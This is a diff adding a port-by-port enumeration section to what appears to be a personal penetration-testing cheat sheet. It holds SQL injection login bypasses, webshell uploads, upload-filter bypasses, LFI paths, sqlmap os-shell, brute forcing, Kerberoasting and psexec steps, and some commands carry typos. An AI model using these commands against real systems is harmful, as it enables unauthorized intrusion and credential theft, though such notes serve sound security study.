@@ -111,6 +111,582 @@ Delete Script from defaults
 
 # Reconnaissance(Information Gathering) done
 
+
+# Enumeration Open Ports
+
+[Pentesting Network](https://book.hacktricks.xyz/pentesting/pentesting-network)
+
+## FTP Enumeration (21)
+
+```bash
+nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1
+FTP anonymous sign in
+	mget * #download everything
+
+#can we upload file as anonymous?
+#if so we can try upload a cmd webshell and execute commands
+locate cmd.aspx #if iis
+put cmd.aspx
+#browse to the file:
+http://IP/cmd.aspx
+
+#we can also try to create a shell payload with msfvenum and upload it
+```
+
+## **SSH (22):**
+
+```bash
+ssh INSERTIPADDRESS 22
+
+nc IP 22
+
+nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s
+
+#downloading
+scp username@hostname:/path/to/remote/file /path/to/local/file
+```
+
+If NMAP show "SSH Filtered" it means that [port knocking](https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/) is enable
+
+```bash
+#we need to find the /etc/knockd.conf (thorough LFI or FTP or something else)
+#inside there is a sequence
+knock IP SEQUENCE1 SEQUENCE2 SEQUENCE3
+#check nmap again
+```
+
+## **SMTP Enumeration (25):**
+
+```bash
+nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1
+```
+
+```bash
+nc -nvv INSERTIPADDRESS 25
+```
+
+```bash
+telnet INSERTIPADDRESS 25
+```
+
+```jsx
+use auxiliary/scanner/smtp/smtp_enum
+msf auxiliary(smtp_enum) > set rhosts 192.168.1.107
+msf auxiliary(smtp_enum) > set rport 25
+msf auxiliary(smtp_enum) > set USER_FILE /root/Desktop/user.txt
+msf auxiliary(smtp_enum) > exploitw
+```
+
+## DNS (53)
+
+```bash
+#DNS zone transfer
+sudo nano /etc/hosts
+10.10.10.123  friendzone.red 
+host -l friendzone.red 10.10.10.123
+```
+
+## **Finger Enumeration (79):**
+
+Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)
+
+```bash
+finger-user-enum.pl [options] (-u username|-U users.txt) (-t host|-T ips.txt)(
+```
+
+## **Web Enumeration (80/443):**
+
+[extra enumeration from hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web)
+
+if we get default apache page, try entering IP to HOSTS
+
+Before dirbusting, try going to index.php or index.html to know which extention to look for 
+
+```bash
+dirbuster (GUI)
+#1st try without "be recursive"
+```
+
+```powershell
+cd ~/tools
+./feroxbuster -u URL -w WORDLIST -x EXT -C 403 -t 100
+```
+
+```bash
+Web Extensions
+
+sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
+```
+
+```bash
+dirb http://target.com /path/to/wordlist
+dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old
+```
+
+```bash
+gobuster dir -u https://target.com -b 403 ms-w /usr/share/wordlists/dirb/big.txt -x .txt,.php
+use -r (recursive) or try found folders
+```
+
+```bash
+nikto –h 10.0.0.1 #web vulnerability scanner
+```
+
+```jsx
+owasp zap
+```
+
+```bash
+Look for Default Credentials
+```
+
+```bash
+sql
+```
+
+- View Page Source
+
+    ```bash
+    Hidden Values
+        Developer Remarks
+        Extraneous Code
+        Passwords!
+    ```
+
+- burpsuite
+
+    ```bash
+    compare “host:”
+    crsf token = no bruteforce
+    add php code if url has anything.php
+            <L>
+     anything being executed?
+            try directory traversal
+                ../../../home
+    ```
+
+- sign in page
+
+    ```bash
+    SQL Injection
+
+        ‘or 1=1– –
+        ‘ or ‘1’=1
+        ‘ or ‘1’=1 — –
+        ‘–
+        Use known Username
+            tyler’ — –
+            tyler’) — –
+
+    #bruteforce
+    hydra -L <username list> -p <password list> <IP Address> <form parameters><failed login message>
+    ```
+
+- file upload
+
+    ```bash
+
+    #if NMAP show something like: Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND
+    #we want to check if we can upload files
+    davtest -url http://IP
+    #if we see succedd we can use curl to upload:
+    curl -X PUT http://10.10.10.15/df.txt -d @test.txt
+    #and execute it:
+    **curl http://10.10.10.15/df.txt**
+
+    Blacklisting bypass
+            bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6 
+        Whitelisting bypass
+            passed by uploading a file with some type of tricks, Like adding a null byte injection like ( shell.php%00.gif ). Or by using double extensions for the uploaded file like ( shell.jpg.php)
+    ```
+
+- Wfuzz - Subdomain brute forcer, replaces a part of the url like username with wordlist
+
+    ```bash
+    wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
+
+    wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
+
+    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
+
+    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
+
+    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
+    ```
+
+- [Knockpy](https://github.com/guelfoweb/knock) - enumerate subdomains on a target domain through a wordlist
+
+    ```bash
+    knockpy domain.com
+    ```
+
+- wpscan - if wordpress found
+
+    ```bash
+    wpscan --url [http://:80$target](http://:80$target) --enumerate u,t,p | tee $target-wpscan-enum
+    #if we can enter wordpres, we can change the 404 page to php reverse shell code and gain access
+    ```
+
+- joomscan - if joomla found
+
+    ```powershell
+
+    cd ~/tools/joomscan
+    perl joomscan.pl -u http://10.10.10.150/administrator/
+    ```
+
+## If A File is found
+
+- steghide - check pictures for hidden files
+
+    ```bash
+        apt-get install steghide
+
+        steghide extract -sf picture.jpg
+
+        steghide info picture.jpg
+
+        apt-get install stegosuite
+    ```
+
+- [Stegseek](https://github.com/RickdeJager/stegseek) - lightning fast steghide cracker to extract hidden data from files
+
+    ```bash
+    stegseek [stegofile.jpg] [wordlist.txt]
+    ```
+
+- binwalk - extract hidden files from files (steganography)
+
+    ```bash
+    binwalk FILE.JPG
+    #if something was found 
+    binwalk -e FILE
+    ```
+
+- strings - check strings in files
+
+    ```bash
+    stringe FILE.jpg
+    ```
+
+- [exiftool](https://github.com/exiftool/exiftool) - pictures metadata
+- zip2john - prepare an encrpyted zip file for john hacking
+
+    ```bash
+    zip2john ZIPFILE > zip.hashs
+    ```
+
+- SQLite DB
+
+    ```powershell
+    #if we found a flat-file db 
+    file EXAMPLE.db
+    #if sqlite3
+    sqlite3 <database-name>
+    .tables
+    PRAGMA table_info(customers);
+    SELECT * FROM customers;
+    ```
+
+- sqlmap - check website for sql injection (more info down)
+
+    [Sqlmap trick](https://hackertarget.com/sqlmap-post-request-injection/) - if we have a login page, we can try admin:admin, catch that in burpsuite,  save the full request to a file, run:
+
+    ```bash
+    sqlmap -r FILENAME --level=5 --risk=3 --batch
+    sqlmap -r FILENAME -dbs --level=5 --risk=3 --batch
+
+    sqlmap -r FILENAME --dbs #enumarate DB's
+    sqlmap -r FILENAME -D DB_Name --tables #enumarate tables
+    sqlmap -r FILENAME -D DB_Name -T TABLE_Name --dump #DUMP table
+
+    #Find SQL in webpage url automatically
+    sqlmap -u https://IP/ –crawl=1
+
+    #with authentication
+    sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password
+
+    #Get A Reverse Shell (MySQL)
+    sqlmap -r post_request.txt --dbms "mysql" --os-shell
+    ```
+
+- [fimap](https://github.com/kurobeats/fimap) - Check for LFI, find, prepare, audit, exploit and even google automatically for local and remote file inclusion
+
+    ```bash
+    ~/tools/fimap/src/fimap.py –H –u http://target-site.com/ -w output.txt
+    ```
+
+    If we see in burpsuite php$url= we need to test for LFI (try /etc/passwrd)
+
+    ```bash
+    http://$ip/index.php?page=/etc/passwd
+    http://$ip/index.php?file=../../../../etc/passwd
+    ```
+
+## if a page redirects to another, we can use burp to stop
+
+```bash
+Proxy -> Options -> Match and Replace
+```
+
+![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled.png)
+
+![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%201.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%201.png)
+
+## kerberos (88):
+
+```powershell
+tel#add host to /etc/hosts
+sudo gedit /etc/hosts
+
+./GetUserSPNs.py -request active.htb/SVC_TGS > admin.txt
+#the password we will get will be encrypted
+john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+#with the cracked password...
+psexec.py administrator@active.htb
+```
+
+## **Pop3 (110):**
+
+```bash
+telnet INSERTIPADDRESS 110
+```
+
+```bash
+USER [username]
+```
+
+```bash
+PASS [password]
+```
+
+- To login
+
+```bash
+LIST
+```
+
+- To list messages
+
+```bash
+RETR [message number]
+```
+
+- Retrieve message
+
+```bash
+QUIT
+```
+
+```bash
+quits
+```
+
+## RPC (135)
+
+```bash
+rpcclient --user="" --command=enumprivs -N $ip #Connect to an RPC share without a username and password and enumerate privledges
+rpcclient --user="<Username>" --command=enumprivs $ip #Connect to an RPC share with a username and enumerate privledges
+```
+
+## **RPCBind (111):**
+
+```bash
+rpcinfo –p x.x.x.x
+```
+
+## **SMB\RPC Enumeration (139/445):**
+
+```bash
+smbmap -H 10.10.10.149
+```
+
+```bash
+smbclient -L \\\\10.0.0.100\\
+smbclient \\\\10.0.0.100\\Replication
+prompt off #doesnt prompt of us downloading
+recurse on` #download all the files
+mget *` #download all files in this share
+
+```
+
+```bash
+enum4linux -a 10.0.0.1 #Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
+```
+
+```bash
+nbtscan x.x.x.x #Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
+```
+
+```bash
+ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
+```
+
+```bash
+python /home/hasamba/tools/impacket/build/scripts-3.8/samrdump.py 192.168.XXX.XXX
+```
+
+```bash
+nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP
+```
+
+smb4k on Kali, useful Linux GUI for browsing SMB shares
+
+```bash
+apt-get install smb4k -y
+```
+
+- on Windows:
+- Download All Files From A Directory Recursively
+
+```bash
+smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
+```
+
+```bash
+net use \\TARGET\IPC$ "" /u:"" #Manual Null session testing
+```
+
+## **SNMP Enumeration (161):**
+
+- Fix SNMP output values so they are human readable:
+
+```bash
+apt-get install snmp-mibs-downloader download-mibs
+echo "" > /etc/snmp/snmp.conf
+```
+
+```bash
+snmpwalk -c public -v1 192.168.1.X 1| 
+ grep hrSWRunName|cut -d* * -f
+```
+
+```bash
+snmpcheck -t 192.168.1.X -c public
+```
+
+```bash
+onesixtyone -c names -i hosts
+```
+
+```bash
+nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
+nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP
+```
+
+```bash
+snmpenum -t 192.168.1.X
+```
+
+```bash
+onesixtyone -c names -i hosts
+```
+
+```bash
+#metasploit
+    auxiliary/scanner/snmp/snmp_enum
+    auxiliary/scanner/snmp/snmp_enum_hp_laserjet
+    auxiliary/scanner/snmp/snmp_enumshares
+    auxiliary/scanner/snmp/snmp_enumusers
+    auxiliary/scanner/snmp/snmp_login
+```
+
+## **Oracle (1521):**
+
+```bash
+tnscmd10g version -h INSERTIPADDRESS
+```
+
+```bash
+tnscmd10g status -h INSERTIPADDRESS
+```
+
+## LDAP (389)
+
+[JXplorer - an open source LDAP browser](http://jxplorer.org/)
+
+## MSSQL (1433)
+
+```bash
+nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt IP
+nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password IP
+```
+
+[Hunting for MSSQL | Offensive Security](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)
+
+## **Mysql Enumeration (3306):**
+
+```bash
+nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
+
+mysql –h IP -u root -p
+show databases;
+show tables;
+use tablename;
+describe table;
+select table1, table2 from tablename;
+```
+
+## Active Directory
+
+```bash
+# current domain info
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# domain trusts
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+# current forest info
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+
+# get forest trust relationships
+([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
+
+# get DCs of a domain
+nltest /dclist:offense.local
+net group "domain controllers" /domain
+
+# get DC for currently authenticated session
+nltest /dsgetdc:offense.local
+
+# get domain trusts from cmd shell
+nltest /domain_trusts
+
+# get user info
+nltest /user:"spotless"
+
+# get DC for currently authenticated session
+set l
+
+# get domain name and DC the user authenticated to
+klist
+
+# get all logon sessions. Includes NTLM authenticated sessions
+klist sessions
+
+# kerberos tickets for the session
+klist
+
+# cached krbtgt
+klist tgt
+
+# whoami on older Windows systems
+set u
+
+# find DFS shares with ADModule
+Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name
+
+# find DFS shares with ADSI
+$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}
+
+# check if spooler service is running on a host
+powershell ls "\\dc01\pipe\spoolss"
+```
+
+
+
+
 # Scanning start
 
 - arp-scan (Kali) - gives all IP's on NAT
